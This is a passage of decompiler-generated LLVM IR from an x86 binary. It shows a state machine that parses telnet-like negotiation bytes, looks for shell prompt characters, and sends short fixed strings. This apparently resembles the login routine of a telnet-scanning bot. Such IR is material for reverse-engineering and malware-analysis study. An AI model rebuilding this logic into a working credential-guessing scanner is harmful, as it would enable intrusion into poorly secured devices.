  %v1_80505d6 = icmp eq i32 %v3_80505d3, 0
  br i1 %v1_80505d6, label %dec_label_pc_805057e, label %dec_label_pc_80505d3.backedge.dec_label_pc_80505da_crit_edge

dec_label_pc_80505d3.backedge.dec_label_pc_80505da_crit_edge: ; preds = %dec_label_pc_80505d3.backedge
  %v1_80505dd.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_80505da

dec_label_pc_80505d3.loopexit12.loopexit:         ; preds = %dec_label_pc_8050a73, %dec_label_pc_80507a5, %dec_label_pc_8050746, %dec_label_pc_8050645, %dec_label_pc_8050cd6, %dec_label_pc_8050a23, %dec_label_pc_80509aa, %dec_label_pc_805096c, %dec_label_pc_805089d, %dec_label_pc_8050c5d, %dec_label_pc_8050815, %dec_label_pc_8050d4f, %dec_label_pc_80507d0, %dec_label_pc_8050dc8, %dec_label_pc_8050597
  %v0_80505d3.pre.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_80505d3.backedge

dec_label_pc_80505da:                             ; preds = %dec_label_pc_80505d3.preheader, %dec_label_pc_80505d3.backedge.dec_label_pc_80505da_crit_edge
  %v1_80505dd = phi i32 [ %v1_80505dd.pre, %dec_label_pc_80505d3.backedge.dec_label_pc_80505da_crit_edge ], [ %v0_805056f, %dec_label_pc_80505d3.preheader ]
  %v0_80505da = phi i32 [ %v0_80505d3, %dec_label_pc_80505d3.backedge.dec_label_pc_80505da_crit_edge ], [ %v0_80505d327, %dec_label_pc_80505d3.preheader ]
  %v1_80505da = add i32 %v0_80505da, 28
  store i32 %v1_80505da, i32* %eax.global-to-local, align 4
  %v2_80505dd = add i32 %v1_80505dd, 16
  %v3_80505dd = inttoptr i32 %v2_80505dd to i32*
  store i32 %v1_80505da, i32* %v3_80505dd, align 4
  %v0_80505e1 = load i32, i32* @edi, align 4
  %v1_80505e1 = add i32 %v0_80505e1, 24
  %v2_80505e1 = inttoptr i32 %v1_80505e1 to i32*
  %v3_80505e1 = load i32, i32* %v2_80505e1, align 4
  %v9_80505e1 = icmp eq i32 %v3_80505e1, 256
  br i1 %v9_80505e1, label %dec_label_pc_8050b97, label %dec_label_pc_80505ee

dec_label_pc_80505ee:                             ; preds = %dec_label_pc_80505da, %dec_label_pc_8050b97
  %v0_80505ee = load i32, i32* @esp, align 4
  %v1_80505ee = add i32 %v0_80505ee, 40
  %v2_80505ee = inttoptr i32 %v1_80505ee to i32*
  %v3_80505ee = load i32, i32* %v2_80505ee, align 4
  store i32 %v3_80505ee, i32* %ecx.global-to-local, align 4
  %v1_80505f2 = add i32 %v0_80505ee, 16
  %v2_80505f2 = inttoptr i32 %v1_80505f2 to i32*
  %v3_80505f2 = load i32, i32* %v2_80505f2, align 4
  store i32 %v3_80505f2, i32* %ebx.global-to-local, align 4
  store i32 256, i32* %eax.global-to-local, align 4
  %v1_80505fb = inttoptr i32 %v3_80505ee to i32*
  store i32 0, i32* %v1_80505fb, align 4
  %v0_8050601 = load i32, i32* @edi, align 4
  %v1_8050601 = add i32 %v0_8050601, 24
  %v2_8050601 = inttoptr i32 %v1_8050601 to i32*
  %v3_8050601 = load i32, i32* %v2_8050601, align 4
  store i32 %v3_8050601, i32* %edx.global-to-local, align 4
  %v0_8050604 = load i32, i32* @esp, align 4
  %v1_8050604 = add i32 %v0_8050604, -4
  %v2_8050604 = inttoptr i32 %v1_8050604 to i32*
  store i32 16384, i32* %v2_8050604, align 4
  %v0_8050609 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8050609 = load i32, i32* %edx.global-to-local, align 4
  %v2_8050609 = add i32 %v1_8050609, %v0_8050609
  store i32 %v2_8050609, i32* @ebx, align 4
  %v0_805060b = load i32, i32* %eax.global-to-local, align 4
  %v2_805060b = sub i32 %v0_805060b, %v1_8050609
  store i32 %v2_805060b, i32* %eax.global-to-local, align 4
  %v2_805060d = add i32 %v0_8050604, -8
  %v3_805060d = inttoptr i32 %v2_805060d to i32*
  store i32 %v2_805060b, i32* %v3_805060d, align 4
  %v0_805060e = load i32, i32* @ebx, align 4
  %v2_805060e = add i32 %v0_8050604, -12
  %v3_805060e = inttoptr i32 %v2_805060e to i32*
  store i32 %v0_805060e, i32* %v3_805060e, align 4
  %v0_805060f = load i32, i32* @edi, align 4
  %v1_805060f = add i32 %v0_805060f, 4
  %v2_805060f = inttoptr i32 %v1_805060f to i32*
  %v3_805060f = load i32, i32* %v2_805060f, align 4
  %v2_8050612 = add i32 %v0_8050604, -16
  %v3_8050612 = inttoptr i32 %v2_8050612 to i32*
  store i32 %v3_805060f, i32* %v3_8050612, align 4
  %v0_8050613 = call i32 @function_80528ae()
  store i32 %v0_8050613, i32* %eax.global-to-local, align 4
  %v0_8050618 = load i32, i32* @esp, align 4
  %v1_8050618 = add i32 %v0_8050618, 16
  %tmp137 = icmp slt i32 %v0_8050613, 1
  br i1 %tmp137, label %dec_label_pc_8050b2c, label %dec_label_pc_8050624

dec_label_pc_8050624:                             ; preds = %dec_label_pc_80505ee
  store i32 0, i32* @edx, align 4
  br label %dec_label_pc_8050626

dec_label_pc_8050626:                             ; preds = %dec_label_pc_8050630, %dec_label_pc_8050624
  %v0_805062c = phi i32 [ %v1_8050630, %dec_label_pc_8050630 ], [ 0, %dec_label_pc_8050624 ]
  %v1_8050626 = load i32, i32* @ebx, align 4
  %v2_8050626 = add i32 %v1_8050626, %v0_805062c
  %v3_8050626 = inttoptr i32 %v2_8050626 to i8*
  %v4_8050626 = load i8, i8* %v3_8050626, align 1
  %v5_8050626 = icmp eq i8 %v4_8050626, 0
  %v1_805062a = icmp eq i1 %v5_8050626, false
  br i1 %v1_805062a, label %dec_label_pc_8050630, label %dec_label_pc_805062c

dec_label_pc_805062c:                             ; preds = %dec_label_pc_8050626
  store i8 65, i8* %v3_8050626, align 1
  %v0_8050630.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_8050630

dec_label_pc_8050630:                             ; preds = %dec_label_pc_8050626, %dec_label_pc_805062c
  %v0_8050630 = phi i32 [ %v0_805062c, %dec_label_pc_8050626 ], [ %v0_8050630.pre, %dec_label_pc_805062c ]
  %v1_8050630 = add i32 %v0_8050630, 1
  store i32 %v1_8050630, i32* @edx, align 4
  %v12_8050631 = icmp eq i32 %v0_8050613, %v1_8050630
  %v1_8050633 = icmp eq i1 %v12_8050631, false
  br i1 %v1_8050633, label %dec_label_pc_8050626, label %dec_label_pc_8050635

dec_label_pc_8050635:                             ; preds = %dec_label_pc_8050630, %dec_label_pc_8050b32
  %v0_8050635 = load i32, i32* @edi, align 4
  %v1_8050635 = add i32 %v0_8050635, 24
  %v2_8050635 = inttoptr i32 %v1_8050635 to i32*
  %v3_8050635 = load i32, i32* %v2_8050635, align 4
  %v2_8050638 = add i32 %v3_8050635, %v0_8050613
  store i32 %v2_8050638, i32* @ebx, align 4
  %v0_805063a = load i32, i32* @global_var_8056910.34, align 16
  store i32 %v0_805063a, i32* %eax.global-to-local, align 4
  store i32 %v2_8050638, i32* %v2_8050635, align 4
  %v0_8050642 = load i32, i32* %eax.global-to-local, align 4
  %v1_8050642 = load i32, i32* @edi, align 4
  %v2_8050642 = add i32 %v1_8050642, 8
  %v3_8050642 = inttoptr i32 %v2_8050642 to i32*
  store i32 %v0_8050642, i32* %v3_8050642, align 4
  br label %dec_label_pc_8050645

dec_label_pc_8050645:                             ; preds = %dec_label_pc_805094c, %dec_label_pc_8050635
  %v0_8050645 = load i32, i32* @edi, align 4
  %v1_8050645 = add i32 %v0_8050645, 12
  %v2_8050645 = inttoptr i32 %v1_8050645 to i32*
  %v3_8050645 = load i32, i32* %v2_8050645, align 4
  store i32 %v3_8050645, i32* %eax.global-to-local, align 4
  switch i32 %v3_8050645, label %dec_label_pc_80505d3.loopexit12.loopexit [
    i32 2, label %dec_label_pc_8050655
    i32 3, label %dec_label_pc_80506e8
    i32 4, label %dec_label_pc_8050770
    i32 5, label %dec_label_pc_8050597
    i32 6, label %dec_label_pc_8050815
    i32 7, label %dec_label_pc_805096c
    i32 8, label %dec_label_pc_80507d0
    i32 9, label %dec_label_pc_8050a23
    i32 10, label %dec_label_pc_8050860
  ]

dec_label_pc_8050655:                             ; preds = %dec_label_pc_8050645
  %v0_8050655 = load i32, i32* @esp, align 4
  %v1_8050655 = add i32 %v0_8050655, 16
  %v2_8050655 = inttoptr i32 %v1_8050655 to i32*
  %v3_8050655 = load i32, i32* %v2_8050655, align 4
  store i32 %v3_8050655, i32* @ebx, align 4
  store i32 0, i32* @ebp, align 4
  %v1_805065b = add i32 %v0_8050645, 24
  %v2_805065b = inttoptr i32 %v1_805065b to i32*
  %v3_805065b = load i32, i32* %v2_805065b, align 4
  store i32 %v3_805065b, i32* %edx.global-to-local, align 4
  %v2_805065e18 = sub i32 0, %v3_805065b
  %v10_805065e22 = and i32 %v3_805065b, %v2_805065e18
  %v11_805065e23 = icmp slt i32 %v10_805065e22, 0
  %v13_805065e25 = icmp slt i32 %v2_805065e18, 0
  %v2_805066026 = icmp eq i1 %v13_805065e25, %v11_805065e23
  br i1 %v2_805066026, label %dec_label_pc_8050a73.thread, label %dec_label_pc_8050662.preheader

dec_label_pc_8050a73.thread:                      ; preds = %dec_label_pc_8050655
  br label %dec_label_pc_80505d3.backedge

dec_label_pc_8050662.preheader:                   ; preds = %dec_label_pc_8050655, %dec_label_pc_805065e.backedge
  %v0_80506dc126 = phi i32 [ %v0_80506dc128, %dec_label_pc_805065e.backedge ], [ %v0_8050645, %dec_label_pc_8050655 ]
  %v0_8050a6b119 = phi i32 [ %v0_805065e, %dec_label_pc_805065e.backedge ], [ 0, %dec_label_pc_8050655 ]
  %v5_8050674108 = phi i32 [ %v5_8050674109, %dec_label_pc_805065e.backedge ], [ 2, %dec_label_pc_8050655 ]
  %v1_805066e106 = phi i32 [ %v1_805065e, %dec_label_pc_805065e.backedge ], [ %v3_805065b, %dec_label_pc_8050655 ]
  %v0_8050667103 = phi i32 [ %v0_8050667104, %dec_label_pc_805065e.backedge ], [ %v0_8050655, %dec_label_pc_8050655 ]
  br label %dec_label_pc_8050662

dec_label_pc_8050662:                             ; preds = %dec_label_pc_8050662.preheader, %dec_label_pc_80506b3
  %v0_80506dc129 = phi i32 [ %v0_80506dc126, %dec_label_pc_8050662.preheader ], [ %v0_80506ca, %dec_label_pc_80506b3 ]
  %v0_8050a6b = phi i32 [ %v0_8050a6b119, %dec_label_pc_8050662.preheader ], [ %v0_80506d0, %dec_label_pc_80506b3 ]
  %v5_8050674 = phi i32 [ %v5_8050674108, %dec_label_pc_8050662.preheader ], [ %v0_80506c5, %dec_label_pc_80506b3 ]
  %v1_805066e = phi i32 [ %v1_805066e106, %dec_label_pc_8050662.preheader ], [ %v3_80506ca, %dec_label_pc_80506b3 ]
  %v0_8050a80 = phi i32 [ %v0_8050667103, %dec_label_pc_8050662.preheader ], [ %v1_80506cd, %dec_label_pc_80506b3 ]
  %v0_8050662 = load i32, i32* @ebx, align 4
  %v1_8050662 = inttoptr i32 %v0_8050662 to i8*
  %v2_8050662 = load i8, i8* %v1_8050662, align 1
  %v12_8050662 = icmp eq i8 %v2_8050662, -1
  %v1_8050665 = icmp eq i1 %v12_8050662, false
  br i1 %v1_8050665, label %dec_label_pc_80506d4, label %dec_label_pc_8050667

dec_label_pc_8050667:                             ; preds = %dec_label_pc_8050662
  %v1_8050667 = add i32 %v0_8050a80, 16
  %v2_8050667 = inttoptr i32 %v1_8050667 to i32*
  %v3_8050667 = load i32, i32* %v2_8050667, align 4
  %v1_805066b = add i32 %v0_8050662, 1
  store i32 %v1_805066b, i32* @esi, align 4
  %v2_805066e = add i32 %v3_8050667, %v1_805066e
  store i32 %v2_805066e, i32* %ecx.global-to-local, align 4
  %tmp297 = icmp ugt i32 %v2_805066e, %v1_805066b
  br i1 %tmp297, label %dec_label_pc_8050674, label %dec_label_pc_80506d4

dec_label_pc_8050674:                             ; preds = %dec_label_pc_8050667
  %v2_8050674 = inttoptr i32 %v1_805066b to i8*
  %v3_8050674 = load i8, i8* %v2_8050674, align 1
  %v4_8050674 = zext i8 %v3_8050674 to i32
  %v6_8050674 = and i32 %v5_8050674, -256
  %v7_8050674 = or i32 %v4_8050674, %v6_8050674
  store i32 %v7_8050674, i32* %eax.global-to-local, align 4
  %v11_8050677 = icmp eq i8 %v3_8050674, -1
  br i1 %v11_8050677, label %dec_label_pc_8050a68, label %dec_label_pc_805067f

dec_label_pc_805067f:                             ; preds = %dec_label_pc_8050674
  %v11_805067f = icmp eq i8 %v3_8050674, -3
  br i1 %v11_805067f, label %dec_label_pc_8050a80, label %dec_label_pc_8050687

dec_label_pc_8050687:                             ; preds = %dec_label_pc_805067f
  %v1_8050687 = add i32 %v0_8050662, 2
  store i32 %v1_8050687, i32* %eax.global-to-local, align 4
  %tmp298 = icmp ugt i32 %v2_805066e, %v1_8050687
  br i1 %tmp298, label %dec_label_pc_805068e, label %dec_label_pc_80506d4

dec_label_pc_805068e:                             ; preds = %dec_label_pc_8050687, %dec_label_pc_8051053, %dec_label_pc_805105b
  %v4_805068e = phi i32 [ %v6_8050afe, %dec_label_pc_8051053 ], [ %v1_8050687, %dec_label_pc_8050687 ], [ %v4_805068e.pre, %dec_label_pc_805105b ]
  %v0_805068e = load i32, i32* @esi, align 4
  %v1_805068e = inttoptr i32 %v0_805068e to i8*
  %v2_805068e = load i8, i8* %v1_805068e, align 1
  %v3_805068e = zext i8 %v2_805068e to i32
  %v5_805068e = and i32 %v4_805068e, -256
  %v6_805068e = or i32 %v3_805068e, %v5_805068e
  store i32 %v6_805068e, i32* %eax.global-to-local, align 4
  %v11_8050690 = icmp eq i8 %v2_805068e, -3
  br i1 %v11_8050690, label %dec_label_pc_8050b15, label %dec_label_pc_8050698

dec_label_pc_8050698:                             ; preds = %dec_label_pc_8050b08, %dec_label_pc_805068e
  %v0_8050b86 = phi i32 [ %v0_8050b0b, %dec_label_pc_8050b08 ], [ %v0_805068e, %dec_label_pc_805068e ]
  %v0_8050698 = phi i32 [ %v6_8050b0b, %dec_label_pc_8050b08 ], [ %v6_805068e, %dec_label_pc_805068e ]
  %v1_8050698 = trunc i32 %v0_8050698 to i8
  %v11_8050698 = icmp eq i8 %v1_8050698, -5
  br i1 %v11_8050698, label %dec_label_pc_8050b86, label %dec_label_pc_80506a0

dec_label_pc_80506a0:                             ; preds = %dec_label_pc_8050698, %dec_label_pc_8050b86
  %v5_80506a0 = phi i32 [ %v0_8050698, %dec_label_pc_8050698 ], [ %v5_80506a0.pre, %dec_label_pc_8050b86 ]
  %v0_80506a0 = load i32, i32* @ebx, align 4
  %v1_80506a0 = add i32 %v0_80506a0, 2
  %v2_80506a0 = inttoptr i32 %v1_80506a0 to i8*
  %v3_80506a0 = load i8, i8* %v2_80506a0, align 1
  %v4_80506a0 = zext i8 %v3_80506a0 to i32
  %v6_80506a0 = and i32 %v5_80506a0, -256
  %v7_80506a0 = or i32 %v4_80506a0, %v6_80506a0
  store i32 %v7_80506a0, i32* %eax.global-to-local, align 4
  %v11_80506a3 = icmp eq i8 %v3_80506a0, -3
  br i1 %v11_80506a3, label %dec_label_pc_8050b23, label %dec_label_pc_80506ab

dec_label_pc_80506ab:                             ; preds = %dec_label_pc_8050b15, %dec_label_pc_80506a0
  %v0_8050b8e = phi i32 [ %v0_8050b18, %dec_label_pc_8050b15 ], [ %v0_80506a0, %dec_label_pc_80506a0 ]
  %v0_80506ab = phi i32 [ %v7_8050b18, %dec_label_pc_8050b15 ], [ %v7_80506a0, %dec_label_pc_80506a0 ]
  %v1_80506ab = trunc i32 %v0_80506ab to i8
  %v11_80506ab = icmp eq i8 %v1_80506ab, -5
  br i1 %v11_80506ab, label %dec_label_pc_8050b8e, label %dec_label_pc_80506b3

dec_label_pc_80506b3:                             ; preds = %dec_label_pc_80506ab, %dec_label_pc_8050b8e, %dec_label_pc_8050b23
  %v0_80506b3 = load i32, i32* @esp, align 4
  %v1_80506b3 = add i32 %v0_80506b3, -4
  %v2_80506b3 = inttoptr i32 %v1_80506b3 to i32*
  store i32 16384, i32* %v2_80506b3, align 4
  %v1_80506b8 = add i32 %v0_80506b3, -8
  %v2_80506b8 = inttoptr i32 %v1_80506b8 to i32*
  store i32 3, i32* %v2_80506b8, align 4
  %v0_80506ba = load i32, i32* @ebx, align 4
  %v2_80506ba = add i32 %v0_80506b3, -12
  %v3_80506ba = inttoptr i32 %v2_80506ba to i32*
  store i32 %v0_80506ba, i32* %v3_80506ba, align 4
  %v0_80506bb = load i32, i32* @ebp, align 4
  %v1_80506bb = add i32 %v0_80506bb, 3
  store i32 %v1_80506bb, i32* @ebp, align 4
  %v0_80506be = load i32, i32* @edi, align 4
  %v1_80506be = add i32 %v0_80506be, 4
  %v2_80506be = inttoptr i32 %v1_80506be to i32*
  %v3_80506be = load i32, i32* %v2_80506be, align 4
  store i32 %v3_80506be, i32* %edx.global-to-local, align 4
  %v0_80506c1 = load i32, i32* @ebx, align 4
  %v1_80506c1 = add i32 %v0_80506c1, 3
  store i32 %v1_80506c1, i32* @ebx, align 4
  %v2_80506c4 = add i32 %v0_80506b3, -16
  %v3_80506c4 = inttoptr i32 %v2_80506c4 to i32*
  store i32 %v3_80506be, i32* %v3_80506c4, align 4
  %v0_80506c5 = call i32 @function_8052924()
  store i32 %v0_80506c5, i32* %eax.global-to-local, align 4
  %v0_80506ca = load i32, i32* @edi, align 4
  %v1_80506ca = add i32 %v0_80506ca, 24
  %v2_80506ca = inttoptr i32 %v1_80506ca to i32*
  %v3_80506ca = load i32, i32* %v2_80506ca, align 4
  store i32 %v3_80506ca, i32* %edx.global-to-local, align 4
  %v0_80506cd = load i32, i32* @esp, align 4
  %v1_80506cd = add i32 %v0_80506cd, 16
  %v0_80506d0 = load i32, i32* @ebp, align 4
  %v2_80506d0 = sub i32 %v0_80506d0, %v3_80506ca
  %v8_80506d0 = xor i32 %v0_80506d0, %v3_80506ca
  %v9_80506d0 = xor i32 %v2_80506d0, %v0_80506d0
  %v10_80506d0 = and i32 %v9_80506d0, %v8_80506d0
  %v11_80506d0 = icmp slt i32 %v10_80506d0, 0
  %v13_80506d0 = icmp slt i32 %v2_80506d0, 0
  %v2_80506d2 = icmp eq i1 %v13_80506d0, %v11_80506d0
  br i1 %v2_80506d2, label %dec_label_pc_80506d4, label %dec_label_pc_8050662

dec_label_pc_80506d4:                             ; preds = %dec_label_pc_805065e.backedge, %dec_label_pc_8050687, %dec_label_pc_8050667, %dec_label_pc_80506b3, %dec_label_pc_8050662, %dec_label_pc_8050a80.dec_label_pc_80506d4.loopexit_crit_edge
  %v0_80506dc = phi i32 [ %v0_8050ae4, %dec_label_pc_8050a80.dec_label_pc_80506d4.loopexit_crit_edge ], [ %v0_80506ca, %dec_label_pc_80506b3 ], [ %v0_80506dc129, %dec_label_pc_8050687 ], [ %v0_80506dc129, %dec_label_pc_8050667 ], [ %v0_80506dc129, %dec_label_pc_8050662 ], [ %v0_80506dc128, %dec_label_pc_805065e.backedge ]
  %v0_80506d4 = phi i32 [ %v0_80506d4.pre.pre, %dec_label_pc_8050a80.dec_label_pc_80506d4.loopexit_crit_edge ], [ %v0_80506d0, %dec_label_pc_80506b3 ], [ %v0_8050a6b, %dec_label_pc_8050687 ], [ %v0_8050a6b, %dec_label_pc_8050667 ], [ %v0_8050a6b, %dec_label_pc_8050662 ], [ %v0_805065e, %dec_label_pc_805065e.backedge ]
  %tmp138 = icmp slt i32 %v0_80506d4, 1
  br i1 %tmp138, label %dec_label_pc_8050a73, label %dec_label_pc_80506dc

dec_label_pc_80506dc:                             ; preds = %dec_label_pc_80506d4
  %v1_80506dc = add i32 %v0_80506dc, 12
  %v2_80506dc = inttoptr i32 %v1_80506dc to i32*
  store i32 3, i32* %v2_80506dc, align 4
  br label %dec_label_pc_8050941

dec_label_pc_80506e8:                             ; preds = %dec_label_pc_8050645
  %v1_80506e8 = add i32 %v0_8050645, 24
  %v2_80506e8 = inttoptr i32 %v1_80506e8 to i32*
  %v3_80506e8 = load i32, i32* %v2_80506e8, align 4
  store i32 %v3_80506e8, i32* %ecx.global-to-local, align 4
  %v1_80506eb = add i32 %v3_80506e8, -1
  store i32 %v1_80506eb, i32* %eax.global-to-local, align 4
  %tmp139 = icmp slt i32 %v1_80506eb, 1
  br i1 %tmp139, label %dec_label_pc_8050726, label %dec_label_pc_80506f2.preheader

dec_label_pc_80506f2.preheader:                   ; preds = %dec_label_pc_80506e8
  %v7_80506f2.pre = load i32, i32* @edx, align 4
  %v2_80506f2 = add i32 %v0_8050645, 28
  br label %dec_label_pc_80506f2

dec_label_pc_80506f2:                             ; preds = %dec_label_pc_80506f2.preheader, %dec_label_pc_8050723
  %v7_80506f2 = phi i32 [ %v7_80506f2.pre, %dec_label_pc_80506f2.preheader ], [ %v9_80506f2, %dec_label_pc_8050723 ]
  %v0_8050bba = phi i32 [ %v1_80506eb, %dec_label_pc_80506f2.preheader ], [ %v1_8050723, %dec_label_pc_8050723 ]
  %v3_80506f2 = add i32 %v2_80506f2, %v0_8050bba
  %v4_80506f2 = inttoptr i32 %v3_80506f2 to i8*
  %v5_80506f2 = load i8, i8* %v4_80506f2, align 1
  %v6_80506f2 = zext i8 %v5_80506f2 to i32
  %v8_80506f2 = and i32 %v7_80506f2, -256
  %v9_80506f2 = or i32 %v6_80506f2, %v8_80506f2
  store i32 %v9_80506f2, i32* %edx.global-to-local, align 4
  %v10_80506f6 = icmp eq i8 %v5_80506f2, 58
  br i1 %v10_80506f6, label %dec_label_pc_8050bba, label %dec_label_pc_80506ff

dec_label_pc_80506ff:                             ; preds = %dec_label_pc_80506f2
  %v10_80506ff = icmp eq i8 %v5_80506f2, 62
  br i1 %v10_80506ff, label %dec_label_pc_8050bba, label %dec_label_pc_8050708

dec_label_pc_8050708:                             ; preds = %dec_label_pc_80506ff
  %v10_8050708 = icmp eq i8 %v5_80506f2, 36
  br i1 %v10_8050708, label %dec_label_pc_8050bba, label %dec_label_pc_8050711

dec_label_pc_8050711:                             ; preds = %dec_label_pc_8050708
  %v10_8050711 = icmp eq i8 %v5_80506f2, 35
  br i1 %v10_8050711, label %dec_label_pc_8050bba, label %dec_label_pc_805071a

dec_label_pc_805071a:                             ; preds = %dec_label_pc_8050711
  %v10_805071a = icmp eq i8 %v5_80506f2, 37
  br i1 %v10_805071a, label %dec_label_pc_8050bba, label %dec_label_pc_8050723

dec_label_pc_8050723:                             ; preds = %dec_label_pc_805071a
  %v1_8050723 = add i32 %v0_8050bba, -1
  %v8_8050723 = icmp eq i32 %v1_8050723, 0
  store i32 %v1_8050723, i32* %eax.global-to-local, align 4
  %v1_8050724 = icmp eq i1 %v8_8050723, false
  br i1 %v1_8050724, label %dec_label_pc_80506f2, label %dec_label_pc_8050726

dec_label_pc_8050726:                             ; preds = %dec_label_pc_8050723, %dec_label_pc_8050bba, %dec_label_pc_80506e8
  %v0_8050726 = load i32, i32* @esp, align 4
  %v1_8050726 = add i32 %v0_8050726, -4
  %v2_8050726 = inttoptr i32 %v1_8050726 to i32*
  store i32 4, i32* %v2_8050726, align 4
  %v1_8050728 = add i32 %v0_8050726, -8
  %v2_8050728 = inttoptr i32 %v1_8050728 to i32*
  store i32 ptrtoint ([5 x i8]* @global_var_8054d05.46 to i32), i32* %v2_8050728, align 4
  %v0_805072d = load i32, i32* %ecx.global-to-local, align 4
  %v2_805072d = add i32 %v0_8050726, -12
  %v3_805072d = inttoptr i32 %v2_805072d to i32*
  store i32 %v0_805072d, i32* %v3_805072d, align 4
  %v1_805072e = add i32 %v0_8050726, 16
  %v2_805072e = inttoptr i32 %v1_805072e to i32*
  %v3_805072e = load i32, i32* %v2_805072e, align 4
  store i32 %v3_805072e, i32* %eax.global-to-local, align 4
  %v2_8050732 = add i32 %v0_8050726, -16
  %v3_8050732 = inttoptr i32 %v2_8050732 to i32*
  store i32 %v3_805072e, i32* %v3_8050732, align 4
  %v0_8050733 = call i32 @function_8051cf0()
  store i32 %v0_8050733, i32* %eax.global-to-local, align 4
  %v0_8050738 = load i32, i32* @esp, align 4
  store i32 %v0_8050733, i32* @ebp, align 4
  %v10_805073d = icmp eq i32 %v0_8050733, -1
  %v1_8050740 = icmp eq i1 %v10_805073d, false
  br i1 %v1_8050740, label %dec_label_pc_8050bc6, label %dec_label_pc_8050746

dec_label_pc_8050746:                             ; preds = %dec_label_pc_8050726
  %v1_8050746 = add i32 %v0_8050738, 12
  %v2_8050746 = inttoptr i32 %v1_8050746 to i32*
  store i32 5, i32* %v2_8050746, align 4
  %v1_8050748 = add i32 %v0_8050738, 8
  %v2_8050748 = inttoptr i32 %v1_8050748 to i32*
  store i32 ptrtoint ([6 x i8]* @global_var_8054d0a.47 to i32), i32* %v2_8050748, align 4
  %v0_805074d = load i32, i32* @edi, align 4
  %v1_805074d = add i32 %v0_805074d, 24
  %v2_805074d = inttoptr i32 %v1_805074d to i32*
  %v3_805074d = load i32, i32* %v2_805074d, align 4
  store i32 %v3_805074d, i32* %eax.global-to-local, align 4
  %v2_8050750 = add i32 %v0_8050738, 4
  %v3_8050750 = inttoptr i32 %v2_8050750 to i32*
  store i32 %v3_805074d, i32* %v3_8050750, align 4
  %v1_8050751 = add i32 %v0_8050738, 32
  %v2_8050751 = inttoptr i32 %v1_8050751 to i32*
  %v3_8050751 = load i32, i32* %v2_8050751, align 4
  store i32 %v3_8050751, i32* %eax.global-to-local, align 4
  %v3_8050755 = inttoptr i32 %v0_8050738 to i32*
  store i32 %v3_8050751, i32* %v3_8050755, align 4
  %v0_8050756 = call i32 @function_8051cf0()
  store i32 %v0_8050756, i32* %eax.global-to-local, align 4
  store i32 %v0_8050756, i32* @ebp, align 4
  %v10_8050760 = icmp eq i32 %v0_8050756, -1
  %v1_8050763 = icmp eq i1 %v10_8050760, false
  br i1 %v1_8050763, label %dec_label_pc_8050bc6, label %dec_label_pc_80505d3.loopexit12.loopexit

dec_label_pc_8050770:                             ; preds = %dec_label_pc_8050645
  %v1_8050770 = add i32 %v0_8050645, 24
  %v2_8050770 = inttoptr i32 %v1_8050770 to i32*
  %v3_8050770 = load i32, i32* %v2_8050770, align 4
  store i32 %v3_8050770, i32* %ecx.global-to-local, align 4
  %v1_8050773 = add i32 %v3_8050770, -1
  store i32 %v1_8050773, i32* %eax.global-to-local, align 4
  %tmp140 = icmp slt i32 %v1_8050773, 1
  br i1 %tmp140, label %dec_label_pc_80507a5, label %dec_label_pc_805077a.preheader

dec_label_pc_805077a.preheader:                   ; preds = %dec_label_pc_8050770
  %v7_805077a.pre = load i32, i32* @edx, align 4
  %v2_805077a = add i32 %v0_8050645, 28
  br label %dec_label_pc_805077a

dec_label_pc_805077a:                             ; preds = %dec_label_pc_805077a.preheader, %dec_label_pc_80507a2
  %v7_805077a = phi i32 [ %v7_805077a.pre, %dec_label_pc_805077a.preheader ], [ %v9_805077a, %dec_label_pc_80507a2 ]
  %v0_8050c0b = phi i32 [ %v1_8050773, %dec_label_pc_805077a.preheader ], [ %v1_80507a2, %dec_label_pc_80507a2 ]
  %v3_805077a = add i32 %v2_805077a, %v0_8050c0b
  %v4_805077a = inttoptr i32 %v3_805077a to i8*
  %v5_805077a = load i8, i8* %v4_805077a, align 1
  %v6_805077a = zext i8 %v5_805077a to i32
  %v8_805077a = and i32 %v7_805077a, -256
  %v9_805077a = or i32 %v6_805077a, %v8_805077a
  store i32 %v9_805077a, i32* %edx.global-to-local, align 4
  %v10_805077e = icmp eq i8 %v5_805077a, 58
  br i1 %v10_805077e, label %dec_label_pc_8050c0b, label %dec_label_pc_8050787

dec_label_pc_8050787:                             ; preds = %dec_label_pc_805077a
  %v10_8050787 = icmp eq i8 %v5_805077a, 62
  br i1 %v10_8050787, label %dec_label_pc_8050c0b, label %dec_label_pc_8050790

dec_label_pc_8050790:                             ; preds = %dec_label_pc_8050787
  %v10_8050790 = icmp eq i8 %v5_805077a, 36
  br i1 %v10_8050790, label %dec_label_pc_8050c0b, label %dec_label_pc_8050799

dec_label_pc_8050799:                             ; preds = %dec_label_pc_8050790
  %v10_8050799 = icmp eq i8 %v5_805077a, 35
  br i1 %v10_8050799, label %dec_label_pc_8050c0b, label %dec_label_pc_80507a2

dec_label_pc_80507a2:                             ; preds = %dec_label_pc_8050799
  %v1_80507a2 = add i32 %v0_8050c0b, -1
  %v8_80507a2 = icmp eq i32 %v1_80507a2, 0
  store i32 %v1_80507a2, i32* %eax.global-to-local, align 4
  %v1_80507a3 = icmp eq i1 %v8_80507a2, false
  br i1 %v1_80507a3, label %dec_label_pc_805077a, label %dec_label_pc_80507a5

dec_label_pc_80507a5:                             ; preds = %dec_label_pc_80507a2, %dec_label_pc_8050c0b, %dec_label_pc_8050770
  %v0_80507a5 = load i32, i32* @esp, align 4
  %v1_80507a5 = add i32 %v0_80507a5, -4
  %v2_80507a5 = inttoptr i32 %v1_80507a5 to i32*
  store i32 7, i32* %v2_80507a5, align 4
  %v1_80507a7 = add i32 %v0_80507a5, -8
  %v2_80507a7 = inttoptr i32 %v1_80507a7 to i32*
  store i32 ptrtoint ([8 x i8]* @global_var_8054d10.48 to i32), i32* %v2_80507a7, align 4
  %v0_80507ac = load i32, i32* %ecx.global-to-local, align 4
  %v2_80507ac = add i32 %v0_80507a5, -12
  %v3_80507ac = inttoptr i32 %v2_80507ac to i32*
  store i32 %v0_80507ac, i32* %v3_80507ac, align 4
  %v1_80507ad = add i32 %v0_80507a5, 16
  %v2_80507ad = inttoptr i32 %v1_80507ad to i32*
  %v3_80507ad = load i32, i32* %v2_80507ad, align 4
  %v2_80507b1 = add i32 %v0_80507a5, -16
  %v3_80507b1 = inttoptr i32 %v2_80507b1 to i32*
  store i32 %v3_80507ad, i32* %v3_80507b1, align 4
  %v0_80507b2 = call i32 @function_8051cf0()
